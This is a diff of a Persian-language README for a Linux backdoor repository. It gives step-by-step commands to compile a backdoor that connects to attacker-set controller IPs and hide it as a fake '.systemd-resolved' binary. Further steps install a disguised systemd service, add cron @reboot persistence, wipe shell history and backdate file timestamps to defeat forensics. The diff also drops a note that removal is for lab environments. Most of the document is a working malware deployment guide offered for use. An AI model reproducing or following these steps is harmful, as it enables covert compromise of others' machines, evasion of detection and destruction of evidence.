@@ -52,46 +52,75 @@ Dark Justice Team**
 
 ---
 
-## 📦 نصب سریع و آسان
-
+## 📦 نصب سریع
+اول از همه آی پی سرور یا سرور های کنترل کننده رو داخل فایل backdoor.c بزارید ، برای این کار :
+```bash
+nano backdoor.c
+```
+و آی پی یا ای پی ها رو رو بزارید داخل ،
 ### روش اول: نصب خودکار (پیشنهادی)
 
+کلون کردن:
 ```bash
 git clone https://github.com/M4lic1ous/Linux-Kernel-Backdoor.git
+```
+ورود به پوشه :
+```bash
 cd Linux-Kernel-Backdoor
+```
+دادن مجوز: 
+```bash
 chmod +x install.sh
+```
+اجرا :
+```bash
 sudo ./install.sh
 ```
 
 ### روش دوم: نصب دستی
 
+ 1. نصب پکیج‌ها
 ```bash
-# 1. نصب پکیج‌ها
 chmod +x setup.sh
 ./setup.sh
-
-# 2. کامپایل بکدور
+```
+ 2. کامپایل بکدور و مجوز مالکیت
+```bash
 gcc -o /usr/local/bin/.systemd-resolved backdoor.c -Wall -O2 -ldl -pthread
+
 chmod 755 /usr/local/bin/.systemd-resolved
+
 chown root:root /usr/local/bin/.systemd-resolved
+```
 
-# 3. نصب سرویس و اسکریپت
+ 3. انتقال اسکریپت
+```bash
 mv System.service /etc/systemd/system/
-mv systemd-linux /usr/local/bin/systemd-linux
-chmod +x /usr/local/bin/systemd-linux
 
-# 4. فعال‌سازی سرویس
+mv systemd-linux /usr/local/bin/systemd-linux
+
+chmod +x /usr/local/bin/systemd-linux
+```
+
+ 4. فعال‌سازی سرویس
+```bash
 systemctl daemon-reload
 systemctl enable System.service
 systemctl start System.service
+```
 
-# 5. اجرای اسکریپت مخفی‌سازی
+ 5. اجرای اسکریپت مخفی‌ سازی Mount کرنل
+```bash
 nohup /usr/local/bin/systemd-linux > /dev/null 2>&1 &
+```
 
-# 6. اضافه به کرون‌جاب
+ 6. اضافه به کرون‌جاب
+```bash
 (crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd-linux > /dev/null 2>&1 &") | crontab -
+```
 
-# 7. پاک‌سازی ردپاها
+ 7. پاک‌سازی ردپاها
+```bash
 history -c
 cat /dev/null > ~/.bash_history
 cat /dev/null > /root/.bash_history
@@ -106,35 +135,9 @@ touch -t 202001011200 /etc/systemd/system/System.service
 touch -t 202001011200 /usr/local/bin/systemd-linux
 ```
 
-### روش سوم: اسکریپت محافظت (مخفی‌سازی بیشتر)
-
-```bash
-# نصب اسکریپت محافظت از تشخیص
-sudo cp protect.sh /usr/local/bin/protect
-sudo chmod +x /usr/local/bin/protect
-sudo protect
-```
-
 ---
 
-## 🛠 استفاده و راه‌اندازی
-
-### شروع سرویس
-```bash
-sudo systemctl start systemd-hidden
-```
-
-### توقف سرویس
-```bash
-sudo systemctl stop systemd-hidden
-```
-
-### وضعیت سرویس
-```bash
-sudo systemctl status systemd-hidden
-```
-
-### حذف کامل (برای محیط آزمایشگاهی)
+### حذف کامل
 ```bash
 sudo systemctl stop systemd-hidden
 sudo systemctl disable systemd-hidden
